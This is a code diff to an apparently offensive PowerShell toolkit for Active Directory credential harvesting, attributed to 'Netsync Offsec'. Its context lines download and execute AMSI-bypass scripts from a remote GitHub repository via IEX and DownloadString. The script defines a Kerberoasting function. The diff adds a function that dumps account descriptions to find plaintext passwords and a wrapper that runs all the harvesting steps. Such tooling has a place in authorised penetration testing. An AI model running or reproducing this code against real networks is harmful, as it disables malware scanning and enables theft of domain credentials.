@@ -3,6 +3,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/amsibypass1.ps1')
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/amsibypass2.ps1')
 
+
 <#
 .SYNOPSIS
     Function used to gather Kerberoastable Hashes.
@@ -20,6 +21,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
     Author: Netsync Offsec
     Version: 1.0
 #>
+
 
 function KerberoastHashes{
     param($Domain)
@@ -87,4 +89,55 @@ function CredentialFinder{
 }
 
 
-    
+<#
+.SYNOPSIS
+    Function used to gather user and computer accounts descriptions that may contain plain text credentials or passwords.
+
+.DESCRIPTION
+    The function retrieves objects samaccountname and descriptions that may contain plain text credentials or passwords.
+
+.PARAMETER Domain
+    Required parameter to specify the domain name to use for the gathering of information.
+
+.EXAMPLE
+   PWdOnDescription -Domain example.com
+   
+.NOTES
+    Author: Netsync Offsec
+    Version: 1.0
+#>
+
+function PWdOnDescription{
+    param($Domain)
+            if (-not (Test-Path "$currentPath\ObjectDescriptions")) {
+        New-Item -ItemType Directory -Path "$currentPath\ObjectDescriptions"
+    }
+    Get-NetUser -Domain $Domain | Where-Object {$_.useraccountcontrol -notmatch 'ACCOUNTDISABLE'} | Select-Object samaccountname,description |Out-File -FilePath "$currentPath\UsersDescription.txt"
+    Get-NetComputer -Domain $Domain | Where-Object {$_.useraccountcontrol -notmatch 'ACCOUNTDISABLE'} | Select-Object samaccountname,description | Out-File -FilePath "$currentPath\ComputersDescription.txt"
+    Move-Item "$currentPath\*Description.txt" -Destination "$currentPath\ObjectDescriptions" -Force
+}
+
+
+<#
+.SYNOPSIS
+    Function that runs all the functions.
+
+.DESCRIPTION
+    The function that iterates to run all of the low hanging fruits such as credentials on sysvol, credentials on object descriptions and credentials on network accessible shares.
+
+.PARAMETER Domain
+    Required parameter to specify the domain name to use for the gathering of information.
+
+.EXAMPLE
+    Invoke-AllCommands -Domain example.com
+   
+.NOTES
+    Author: Netsync Offsec
+    Version: 1.0
+#>
+function Invoke-AllCommands {
+    param($Domain)
+    KerberoastHashes -Domain $Domain
+    CredentialFinder -Domain $Domain
+    PWdOnDescription -Domain $Domain
+}
